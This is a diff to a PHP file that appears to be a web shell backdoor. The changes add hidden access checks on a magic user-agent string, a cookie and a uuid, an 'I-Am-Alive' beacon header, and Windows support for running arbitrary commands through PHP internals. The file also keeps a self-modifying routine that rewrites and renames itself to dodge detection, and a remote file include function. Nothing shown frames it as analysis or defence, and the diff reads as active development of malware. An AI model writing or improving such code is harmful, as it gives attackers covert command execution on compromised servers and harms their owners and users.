@@ -1,6 +1,17 @@
 <?php
 //leave me in.
 
+if (!defined("allow_agent")){
+    define("allow_agent", "sp1.1");
+}
+if (!defined("uuid")){
+    define("uuid", "");
+}
+if (!defined("cval")){
+    define("cval", "");
+    define("cname", "");
+}
+
 if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
@@ -46,7 +57,7 @@ ini_set("memory_limit", "1000M");
 
 function uwumodifyme()
 {
-    if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
+    if (is_writable(getcwd()."/")) {
         $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
         $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
         $new_name = bin2hex(openssl_random_pseudo_bytes(10));
@@ -229,12 +240,12 @@ function remoteFileInclude($targetFile)
     }
 }
 
-function validate_auth($agent): bool
+function validate_auth($agent, $cookie_val, $uuid): bool
 {
-    if (is_null($agent)){
+    if (is_null($agent) || is_null($cookie_val) || is_null($uuid)){
         return false;
     }
-    if (str_contains($agent, "sp1.1") !== false){
+    if (str_contains($agent, allow_agent) !== false && str_contains($cookie_val, cval) !== false && str_contains($uuid, uuid) !== false){
         return true;
     }else{
         return false;
@@ -252,6 +263,9 @@ function normalize_for_windows($com): string
 }
 function executeCommands($command)
 {
+    if (str_contains(strtolower(slopos), "windows") !== false){
+        $command = normalize_for_windows($command);
+    }
     # Try to find a way to run our command using various PHP internals
     if (function_exists('call_user_func_array')) {
         # http://php.net/manual/en/function.call-user-func-array.php
@@ -281,7 +295,8 @@ function executeCommands($command)
 
 function slopp()
 {
-    if (validate_auth($_SERVER['HTTP_USER_AGENT'])) {
+    if (validate_auth($_SERVER['HTTP_USER_AGENT'], $_COOKIE[cname], $_REQUEST['uuid'])) {
+        header("I-Am-Alive: Yes");
         banner();
         if ($_SERVER["REQUEST_METHOD"] == "POST") {
             if (isset($_POST["cr"])) {
